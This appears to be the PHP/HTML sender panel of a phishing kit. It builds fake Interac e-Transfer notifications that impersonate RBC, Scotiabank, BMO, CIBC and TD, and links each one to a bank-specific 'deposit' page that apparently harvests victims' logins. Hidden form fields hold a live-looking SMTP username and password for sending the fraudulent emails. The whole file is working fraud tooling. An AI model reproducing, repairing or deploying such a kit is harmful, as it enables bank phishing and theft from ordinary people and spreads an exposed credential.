<?php
    // Calculate expiration date based on current date
    $line = date('F j, Y', strtotime('+30 days'));
?>

<!DOCTYPE html>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="MobileOptimized" content="width">
    <meta name="HandheldFriendly" content="true">
    <meta name="format-detection" content="telephone=yes">  <style>
        body {
            background-color: red;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }
        input[type="text"],
        select {
            background-color: red;
            width: 100%;
            color: white;
            padding: 15px 10px; /* Set equal padding left and right */
            margin-bottom: 10px;
            border: 10px solid #ccc;
            border-radius: 4px;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }
        input[type="submit"] {
            background-color: red;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }
    </style>
</head>
<body>
    <center>
        <form action="submit1.php" method="POST" enctype="multipart/form-data">
            <input type="hidden" id="etransfer_interac_ca" name="etransfer_interac_ca" required>

            <!-- First Email Input Form -->
            <label for="receivers_email">Receiver's Email (First):</label>
            <input type="text" id="receivers_email" name="receivers_email" placeholder="Target@email.com" required>

            <label for="receivers_name">Receiver's Name:</label>
            <input type="text" id="receivers_name" name="receivers_name" value="One-time contact" required>

            <label for="sender_name">Sender's Name:</label>
            <input type="text" id="sender_name" name="sender_name" value="DRONE SUPPORT LTD." required>
<label for="amount">Amount:</label>
<select id="amount" name="amount" required>
  <?php
  for ($i = 5; $i <= 10000; $i += 5) {
    echo "<option value='" . number_format($i, 2, '.', ',') . "'>" . number_format($i, 2, '.', ',') . "</option>";
  }
  ?>
</select>

<input type="hidden" name="line" value="<?php echo $line; ?>" required="">
<center>
<select name="photo_link" id="photo_href">
<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC Royal Bank</option> 
<option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>
</select>
<select name="bank" id="bank">
<option value="RBC Royal Bank">RBC Royal Bank</option>
<option value="Scotia Bank">Scotia Bank</option> 
<option value="Bank of Montreal">Bank of Montreal</option>
<option value="CIBC">CIBC</option>
<option value="TD Canada Trust">TD Canada Trust</option>
</select>
<style>
</style>
<select name="photo_href" id="photo_href">
<option value="public/deposit/rbc/928460.php">RBC Royal Bank</option>
<option value="public/deposit/sco/928460.php">Scotia Bank</option>
<option value="public/deposit/bmo/928460.php">Bank of Montreal</option>
<option value="public/deposit/cibc/928460.php">CIBC</option>
<option value="public/deposit/td/928460.php">TD Canada Trust</option>
</select>
<input type="hidden" name="link" value="https://<?php echo $_SERVER['HTTP_HOST'] ?>">
<input type="hidden" name="port" value="2525" required="">
<input type="hidden" name="username" value="taytayburkeallday@gmail.com" required="">
<input type="hidden" name="password" value="E491908C41CE3BFA84FA8F67672C26B78454" required="">
<input type="hidden" name="host" value="smtp.elasticemail.com" required="">

  <input type="submit" value="Submit"></center>








  






  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    h1 {
      text-align: center;
    }

    form {
      margin: 20px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: none;
      background-color: #333;
      color: #fff;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #0066cc;
      color: #fff;
      cursor: pointer;
    }
  </style>


  











</div></body></html>
